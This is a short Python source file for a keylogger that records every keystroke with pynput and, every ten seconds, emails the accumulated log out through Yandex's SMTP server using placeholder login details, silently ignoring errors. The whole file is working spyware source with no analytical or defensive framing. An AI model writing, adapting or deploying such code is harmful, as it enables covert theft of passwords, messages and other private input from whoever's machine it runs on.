import pynput.keyboard
import smtplib
import threading

log = ""
def callback_func(key):
    global log
    try:
        log = log +str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass


def send_mail(email,password,message):
    try:
        email_server = smtplib.SMTP_SSL('smtp.yandex.com.tr', 465)
        email_server.login(email,password)
        email_server.sendmail(email,email,message)
        email_server.quit()
        email_server.quit()
    except:
        pass



keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)


def threading_func():
    global log
    send_mail("XXXX@yandex.com", "PASSWORD",log.encode("utf-8"))
    log=""
    timer_object = threading.Timer(10,threading_func)
    timer_object.start()



with keylogger_listener:
    threading_func()
    keylogger_listener.join()

